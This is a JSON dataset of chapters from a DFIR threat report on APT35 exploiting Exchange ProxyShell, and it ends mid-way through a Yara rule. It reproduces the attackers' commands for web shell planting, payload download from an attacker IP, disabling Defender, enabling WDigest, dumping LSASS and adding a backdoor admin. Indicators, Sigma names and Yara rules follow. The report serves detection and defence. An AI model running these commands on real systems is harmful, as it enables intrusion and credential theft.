@@ -1,0 +1,301 @@
+[
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xb6c93dad",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "text": "March 21, 2022\nIn December 2021, we observed an adversary exploiting the Microsoft Exchange ProxyShell vulnerabilities to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, Exchange Exploit Leads to Domain Wide Ransomware.\nIn this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related to APT35 (TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTPs mirroring previously reported activity that was attributed to the group."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xb1c2b7f3",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "text": "APT35\nFast Reverse Proxy\nProxyShell\nUncategorized"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xbbe1115a",
+            "title": "Case Summary",
+            "text": "The threat actors activity occurred in two bursts within a 3 day time frame. As with our previous case, they started by uploading their web shell and disabling antivirus services.\nSoon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the remote desktop users and local administrators users groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.\nAfter establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig. At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.\nAll of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out. The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.\nTwo days later, we saw the threat actors reappear. We expected them to pick up where they left off, however, they repeated all previous actions. Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.\nNo further activity was observed as the threat actors were evicted from the network."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x98736a31",
+            "title": "Timeline",
+            "text": "Analysis and reporting completed by @samaritan_o, @kostastsale, @svch0st and @RoxpinTeddy."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x141efff0",
+            "title": "Initial Access",
+            "text": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:\nCVE-2021-34473\nCVE-2021-34523\nCVE-2021-31207\nWith the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.\nOnce the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:\nNew-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"administrator@<REDACTED>\"\nThe threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.\nNew-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\aspx_wkggiyvttmu.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_wkggiyvttmu'\"\nIn an attempt to hide the actions taken, the actor removes the request just created:\nRemove-MailboxExportRequest -Confirm \"False\" -Force \"True\" -Identity \"77a883a7-470c-471c-a193-f4c54f263fde\"\nThis activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first.\nNew-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\system_web\\aspx_dyukbdcxjfi.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_dyukbdcxjfi'\""
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x88071c48",
+            "title": "Execution",
+            "text": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.\nThe web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran. The web shell had predefined functions for special actions:\nget Get file from location on disk (additional dst POST parameter)\nput Upload file to location (additional dst POST parameter)\nrun Execute a list of commands separated by ; using PowerShell.\nIf exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.\nThe environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.\nThe actor first uploaded a file Wininet.xml, which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.\nScheduled Task Commands:\nschtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\nschtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\nDefender Modification Command:\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\nStart-Process powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}\nThe schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell. Wininet.bat simply loops through the execution of the file dllhost.exe.\nThe file dllhost.exe is a golang binary. When executed, the binary was observed resolving the following domains:\napi.myip[.]com (for discovery)\ntcp443.msupdate[.]us\nkcp53.msupdate[.]us\nThe binary also spawns the following commands when executed:\ncmd /c wmic computersystem get domain\npowershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\nThe binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x5ccee8f8",
+            "title": "Persistence",
+            "text": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.\nNew account creation\nDuring the first activity, we observed the use of user.exe executable that ran the following PowerShell command:\npowershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount\nThe first thing they did was make a new user named DefaultAccount with the password P@ssw0rd123412. They then activated the account and changed the password (P@ssw0rd12341234) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.\nThe threat actors ran the same command again two days later:\npowershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount\nDue to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.\nScheduled task\nAs previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.\nBelow, we can observe the content of wininet.xml:\nThe following commands where then ran to initiate the task and to achieve persistence:\nschtasks.exe /Create /F /XML %wintmp%\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\nschtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x607a921a",
+            "title": "Privilege Escalation",
+            "text": "The scheduled task created by the web shell was set to use the principal SID S-1-5-18, or SYSTEM.\n<UserId>S-1-5-18</UserId>\nThe threat actor also added their newly created account to the local administrator group:\nnet localgroup administrators /add DefaultAccount"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x46dde279",
+            "title": "Defense Evasion",
+            "text": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:\nWindows Defender Behavior Monitoring was disabled.\nThe Severe Threat default action was set to Allow.\nRealtime Monitoring was disabled.\nThe C:\\Windows path was excluded from scheduled and real-time scanning.\ntry {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\nA rule was added to the Windows Firewall to allow remote RDP traffic.\n\"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389\nRemote Desktop Services was started.\n\"net\" start TermService\nThe threat actor enabled WDigest authentication. This enforces the storage of credentials in plaintext on future logins.\n\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\nLSA protection was disabled.\n\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x344f18df",
+            "title": "Credential Access",
+            "text": "The threat actor created a process memory dump from LSASS.exe. In this case they created a minidump using the LOLBIN comsvcs.dll. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.\n\"powershell.exe\" /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive C:\\windows\\temp\\ssasl.pmd C:\\windows\\temp\\ssasl.zip"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x37e2369c",
+            "title": "Discovery",
+            "text": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as:\nnet.exe user\nipconfig.exe /all\npowershell.exe (multiple commands)\nquser.exe\nThese discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.\nThey used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.\nGet-WMIObject Win32_NTDomain | findstr DomainController\nAdditionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test.\nAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\""
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xc81aed5e",
+            "title": "Collection",
+            "text": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x3636481e",
+            "title": "Command and Control",
+            "text": "As we saw from the execution section,dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.\ntcp443.msupdate[.]us (107.173.231[.]114)\nkcp53.msupdate[.]us\n(107.173.231[.]114)\nThis C2 channel was not used very much as most activity was done through the web shell."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x37f864be",
+            "title": "Exfiltration",
+            "text": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.\nHere you can see the threat actor using the web shell command to extract it:"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x1b586ee0",
+            "title": "Impact",
+            "text": "In this case, there was no further impact to the environment before the threat actors were evicted. Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x1299f084",
+            "title": "Indicators",
+            "text": "All artifacts including web shells, files, IPs, etc. were added to our services in December."
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x6fe6d5b6",
+            "title": "Network",
+            "text": "ipv4:148.251.71[.]182\nipv4:107.173.231[.]114\ndomain: tcp443.msupdate[.]us\ndomain: kcp53.msupdate[.]us\nuseragent:python-urllib3/1.26.7\nuseragent:python-requests/2.26.0\nET INFO User-Agent (python-requests) Inbound to Webserver\nET INFO Generic HTTP EXE Upload Inbound\nET INFO Generic HTTP EXE Upload Outbound\nGPL ATTACK_RESPONSE command completed\nET ATTACK_RESPONSE Net User Command Response\nET WEB_SERVER WebShell Generic - netsh firewall"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x8ab4aec",
+            "title": "File",
+            "text": "aspx_dyukbdcxjfi.aspx\n1a5ad24a6880eea807078375d6461f58\nda2470c3990ea0862a79149c6036388498da83cd\n84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7\ndhvqx.aspx\nb2fde6dc7bd1e04ce601f57805de415b\n4d243969b54b9b80c1d26e0801a6e7e46d2ef03e\nc5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8\ndllhost.exe\n9a3703f9c532ae2ec3025840fa449d4e\n8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee\n1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e\nwininet.bat\n5f098b55f94f5a448ca28904a57c0e58\n27102b416ef5df186bd8b35190c2a4cc4e2fbf37\n668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0\nwininet.xml\nd2f4647a3749d30a35d5a8faff41765e\n0f676bc786db3c44cac4d2d22070fb514b4cb64c\n559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e\nuser.exe\nf0be699c8aafc41b25a8fc0974cc4582\n6bae2d45bbd8c4b0a59ba08892692fe86e596154\n7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\ntask_update.exe\ncacb64bdf648444e66c82f5ce61caf4b\n3a6431169073d61748829c31a9da29123dd61da8\n12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075f"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x986a9901",
+            "title": "Detections",
+            "text": ""
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x366aa06e",
+            "title": "Sigma",
+            "text": "Local Accounts Discovery\nLsass Memory Dump via Comsvcs DLL\nNet.exe Execution\nNet-exe User Account Creation\nNetsh Port or Application Allowed\nNetsh RDP Port Opening\nNon Interactive PowerShell\nPowershell Defender Exclusion\nPowerShell Get-Process LSASS\nProcess Dump via Comsvcs DLL\nQuick Execution of a Series of Suspicious Commands\nRare Scheduled Task Creations\nService Execution\nShells Spawned by Web Servers\nSuspicious PowerShell Parent Process\nSuspicious Script Execution From Temp Folder\nWdigest Enable UseLogonCredential\nWebshell Detection With Command Line Keywords\nWindows Defender Real-Time Protection Disabled\nWindows Defender Threat Detection Disabled\nWindows Shell Spawning Suspicious Program\nWindows Suspicious Use Of Web Request in CommandLine\nWindows Webshell Creation"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0x405b0e0a",
+            "title": "Yara",
+            "text": "rule files_dhvqx {\n meta:\n description = \"9893_files - file dhvqx.aspx\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8\"\n strings:\n $s1 = \"eval(Request['exec_code'],'unsafe');Response.End;\" fullword ascii\n $s2 = \"6<script language='JScript' runat='server'>\" fullword ascii\n $s3 = \"AEALAAAAAAAAAAA\" fullword ascii\n $s4 = \"AFAVAJA\" fullword ascii\n $s5 = \"AAAAAAV\" fullword ascii\n $s6 = \"LAAAAAAA\" fullword ascii\n $s7 = \"ANAZAQA\" fullword ascii\n $s8 = \"ALAAAAA\" fullword ascii\n $s9 = \"AAAAAEA\" ascii\n $s10 = \"ALAHAUA\" fullword ascii\n condition:\n uint16(0) == 0x4221 and filesize < 800KB and\n ($s1 and $s2) and 4 of them\n}\nrule aspx_dyukbdcxjfi {\n meta:\n description = \"9893_files - file aspx_dyukbdcxjfi.aspx\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7\"\n strings:\n $s1 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty\" ascii\n $s2 = \"string[] commands = exec_code.Substring(\\\"run \\\".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty\" ascii\n $s3 = \"var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));\" fullword ascii\n $s4 = \"info.UseShellExecute = false;\" fullword ascii\n $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword ascii\n $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword ascii\n $s7 = \"else if (exec_code.StartsWith(\\\"download \\\"))\" fullword ascii\n $s8 = \"string[] parts = exec_code.Substring(\\\"download \\\".Length).Split(' ');\" fullword ascii\n $s9 = \"Response.AppendHeader(\\\"Content-Disposition\\\", \\\"attachment; filename=\\\" + fileName);\" fullword ascii\n $s10 = \"result = result + Environment.NewLine + \\\"ERROR:\\\" + Environment.NewLine + error;\" fullword ascii\n $s11 = \"else if (exec_code == \\\"get\\\")\" fullword ascii\n $s12 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n condition:\n uint16(0) == 0x4221 and filesize < 800KB and\n 8 of them\n}\nrule files_user {\n meta:\n description = \"9893_files - file user.exe\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\"\n strings:\n $x1 = \"PA<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVer\" ascii\n $s2 = \"\\\", or \\\"requireAdministrator\\\" --> <v3:requestedExecutionLevel level=\\\"requireAdministrator\\\" /> </v3:requestedPrivileges> </v3\" ascii\n $s3 = \"-InitOnceExecuteOnce\" fullword ascii\n $s4 = \"0\\\"> <dependency> <dependentAssembly> <assemblyIdentity type=\\\"win32\\\" name=\\\"Microsoft.Windows.Common-Controls\\\" version=\\\"6.0.\" ascii\n $s5 = \"s:v3=\\\"urn:schemas-microsoft-com:asm.v3\\\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \\\"asInvoker\\\", \\\"highestAvai\" ascii\n $s6 = \"PB_GadgetStack_%I64i\" fullword ascii\n $s7 = \"PB_DropAccept\" fullword ascii\n $s8 = \"rocessorArchitecture=\\\"*\\\" publicKeyToken=\\\"6595b64144ccf1df\\\" language=\\\"*\\\" /> </dependentAssembly> </dependency> <v3:trustInf\" ascii\n $s9 = \"PB_PostEventMessage\" fullword ascii\n $s10 = \"PB_WindowID\" fullword ascii\n $s11 = \"?GetLongPathNameA\" fullword ascii\n $s12 = \"Memory page error\" fullword ascii\n $s13 = \"PPPPPPH\" fullword ascii\n $s14 = \"YZAXAYH\" fullword ascii\n $s15 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n $s16 = \"NGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDI\" ascii\n $s17 = \"PYZAXAYH\" fullword ascii\n $s18 = \"PB_MDI_Gadget\" fullword ascii\n $s19 = \"PA<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVer\" ascii\n $s20 = \" 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108 A2DB26CE3BBE7B2CB12F9BEFB37891A3\" fullword wide\n condition:\n uint16(0) == 0x5a4d and filesize < 300KB and\n 1 of ($x*) and 4 of them\n}\nrule task_update {\n meta:\n description = \"9893_files - file task_update.exe\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\"\n strings:\n $x1 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii\n $s2 = \" or \\\"requireAdministrator\\\" --> <v3:requestedExecutionLevel level=\\\"requireAdministrator\\\" /> </v3:requestedPrivileges> </v3:se\" ascii\n $s3 = \"-InitOnceExecuteOnce\" fullword ascii\n $s4 = \"> <dependency> <dependentAssembly> <assemblyIdentity type=\\\"win32\\\" name=\\\"Microsoft.Windows.Common-Controls\\\" version=\\\"6.0.0.0\" ascii\n $s5 = \"v3=\\\"urn:schemas-microsoft-com:asm.v3\\\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \\\"asInvoker\\\", \\\"highestAvaila\" ascii\n $s6 = \"PB_GadgetStack_%I64i\" fullword ascii\n $s7 = \"PB_DropAccept\" fullword ascii\n $s8 = \"PB_PostEventMessage\" fullword ascii\n $s9 = \"PB_WindowID\" fullword ascii\n $s10 = \"?GetLongPathNameA\" fullword ascii\n $s11 = \"cessorArchitecture=\\\"*\\\" publicKeyToken=\\\"6595b64144ccf1df\\\" language=\\\"*\\\" /> </dependentAssembly> </dependency> <v3:trustInfo \" ascii\n $s12 = \"Memory page error\" fullword ascii\n $s13 = \"PPPPPPH\" fullword ascii\n $s14 = \"YZAXAYH\" fullword ascii\n $s15 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n $s16 = \"PYZAXAYH\" fullword ascii\n $s17 = \"PB_MDI_Gadget\" fullword ascii\n $s18 = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?> <assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersi\" ascii\n $s19 = \" 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09\" fullword wide\n $s20 = \"PostEventClass\" fullword ascii\n condition:\n uint16(0) == 0x5a4d and filesize < 300KB and\n 1 of ($x*) and 4 of them\n}\nrule App_Web_vjloy3pa {\n meta:\n description = \"9893_files - file App_Web_vjloy3pa.dll\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970\"\n strings:\n $x2 = \"hSystem.ComponentModel.DataAnnotations, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s3 = \"MSystem.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n $s4 = \"RSystem.Xml.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n $s5 = \"ZSystem.ServiceModel.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s6 = \"YSystem.Web.DynamicData, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s7 = \"XSystem.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s8 = \"VSystem.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n $s9 = \"MSystem.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n $s10 = \"WSystem.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n $s11 = \"`System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n $s12 = \"NSystem.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n $s13 = \"ZSystem.WorkflowServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s14 = \"WSystem.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n $s15 = \"aSystem.ServiceModel.Activation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n 